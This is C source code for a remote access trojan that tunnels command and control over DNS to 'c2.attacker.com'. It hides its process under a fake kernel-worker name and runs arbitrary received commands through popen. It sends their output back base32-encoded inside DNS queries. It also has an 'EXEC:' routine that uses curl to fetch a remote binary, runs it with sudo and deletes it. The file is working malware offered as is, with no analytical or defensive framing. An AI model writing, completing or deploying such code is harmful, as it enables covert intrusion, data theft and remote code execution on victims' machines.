#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <resolv.h>
#include <signal.h>

#define C2_DOMAIN    "c2.attacker.com"
#define C2_DNS_IP    "192.168.18.132"
#define SLEEP_BASE   30
#define JITTER_MAX   10
#define FAKE_NAME    "[kworker/0:0]"
#define LOCKFILE     "/tmp/.rat.lock"

static const char B32_ALPHA[] = "abcdefghijklmnopqrstuvwxyz234567";

void base32_encode(const uint8_t *in, size_t inlen, char *out) {
    size_t i = 0, j = 0;
    uint32_t buf = 0;
    int bits = 0;
    for (i = 0; i < inlen; i++) {
        buf = (buf << 8) | in[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            out[j++] = B32_ALPHA[(buf >> bits) & 0x1F];
        }
    }
    if (bits > 0)
        out[j++] = B32_ALPHA[(buf << (5 - bits)) & 0x1F];
    out[j] = '\0';
}

void spoof_process_name(int argc, char *argv[]) {
    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], FAKE_NAME, strlen(argv[0]));
    prctl(PR_SET_NAME, FAKE_NAME, 0, 0, 0);
    FILE *f = fopen("/proc/self/comm", "w");
    if (f) { fprintf(f, "%s", FAKE_NAME); fclose(f); }
}

int already_running() {
    FILE *lf = fopen(LOCKFILE, "r");
    if (!lf) return 0;
    pid_t old_pid;
    fscanf(lf, "%d", &old_pid);
    fclose(lf);
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", old_pid);
    if (access(proc_path, F_OK) == 0) return 1;
    unlink(LOCKFILE);
    return 0;
}

void create_lockfile() {
    FILE *lf = fopen(LOCKFILE, "w");
    if (lf) { fprintf(lf, "%d\n", getpid()); fclose(lf); }
}

int calc_sleep() {
    int jitter = (rand() % (JITTER_MAX * 2 + 1)) - JITTER_MAX;
    return SLEEP_BASE + jitter;
}

static int send_dns_query(const char *query_name,
                           unsigned char *answer, int answer_size) {
    unsigned char packet[512];
    int pkt_len = 0;

    uint16_t txid = (uint16_t)(rand() & 0xFFFF);
    packet[pkt_len++] = (txid >> 8) & 0xFF;
    packet[pkt_len++] = txid & 0xFF;
    packet[pkt_len++] = 0x01;
    packet[pkt_len++] = 0x00;
    packet[pkt_len++] = 0x00; packet[pkt_len++] = 0x01;
    packet[pkt_len++] = 0x00; packet[pkt_len++] = 0x00;
    packet[pkt_len++] = 0x00; packet[pkt_len++] = 0x00;
    packet[pkt_len++] = 0x00; packet[pkt_len++] = 0x00;

    char name_copy[256];
    strncpy(name_copy, query_name, sizeof(name_copy) - 1);
    char *token = strtok(name_copy, ".");
    while (token) {
        int len = strlen(token);
        packet[pkt_len++] = (unsigned char)len;
        memcpy(packet + pkt_len, token, len);
        pkt_len += len;
        token = strtok(NULL, ".");
    }
    packet[pkt_len++] = 0x00;
    packet[pkt_len++] = 0x00; packet[pkt_len++] = 0x10;
    packet[pkt_len++] = 0x00; packet[pkt_len++] = 0x01;

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = { 5, 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(53);
    inet_aton(C2_DNS_IP, &server.sin_addr);

    sendto(sock, packet, pkt_len, 0,
           (struct sockaddr*)&server, sizeof(server));

    int ret = recvfrom(sock, answer, answer_size, 0, NULL, NULL);
    close(sock);
    return ret;
}

int dns_send(const char *data, size_t datalen, uint32_t seq) {
    char encoded[256];
    char query[512];
    unsigned char answer[1024];
    base32_encode((uint8_t*)data, datalen, encoded);
    snprintf(query, sizeof(query), "%u.%s.%s", seq, encoded, C2_DOMAIN);
    return send_dns_query(query, answer, sizeof(answer));
}

int dns_recv_command(char *cmd_out, size_t cmd_max) {
    char query[512];
    unsigned char answer[1024];
    snprintf(query, sizeof(query), "beacon.%s", C2_DOMAIN);
    int ret = send_dns_query(query, answer, sizeof(answer));
    if (ret < 0) return -1;

    ns_msg msg;
    ns_rr rr;
    if (ns_initparse(answer, ret, &msg) < 0) return -1;
    if (ns_msg_count(msg, ns_s_an) == 0) return 0;
    if (ns_parserr(&msg, ns_s_an, 0, &rr) < 0) return -1;

    const uint8_t *rdata = ns_rr_rdata(rr);
    uint8_t txtlen = rdata[0];
    if (txtlen >= cmd_max) txtlen = cmd_max - 1;
    memcpy(cmd_out, rdata + 1, txtlen);
    cmd_out[txtlen] = '\0';
    return txtlen;
}

void rat_loop() {
    char cmd[256];
    uint32_t seq = 0;

    srand(time(NULL) ^ getpid());

    printf("[*] RAT attivo — PID: %d\n", getpid());
    printf("[*] C2: %s via DNS tunneling\n", C2_DOMAIN);

    while (1) {
        int cmdlen = dns_recv_command(cmd, sizeof(cmd));

        if (cmdlen > 0) {
            printf("[*] Comando ricevuto: %s\n", cmd);

            if (strncmp(cmd, "EXEC:", 5) == 0) {
                char url[256];
                strncpy(url, cmd + 5, sizeof(url) - 1);
                char dl_cmd[512];
                snprintf(dl_cmd, sizeof(dl_cmd),
                    "curl -s %s -o /tmp/.mod_%u && "
                    "chmod +x /tmp/.mod_%u && "
                    "sudo /tmp/.mod_%u && "
                    "rm -f /tmp/.mod_%u",
                    url, seq, seq, seq, seq);
                system(dl_cmd);
                char res2[64];
                snprintf(res2, sizeof(res2), "module executed");
                dns_send(res2, strlen(res2), seq++);

            } else {
                FILE *fp = popen(cmd, "r");
                if (fp) {
                    char line[128];
                    while (fgets(line, sizeof(line), fp)) {
                        line[strcspn(line, "\n")] = 0;
                        if (strlen(line) > 0) {
                            dns_send(line, strlen(line), seq++);
                            usleep(200000);
                        }
                    }
                    pclose(fp);
                    printf("[*] Output inviato\n");
                }
            }
        }

        int sleep_time = calc_sleep();
        printf("[*] Sleep: %d secondi\n", sleep_time);
        sleep(sleep_time);
    }
}

int main(int argc, char *argv[]) {
    if (already_running()) exit(0);
    create_lockfile();
    spoof_process_name(argc, argv);
    rat_loop();
    unlink(LOCKFILE);
    return 0;
}
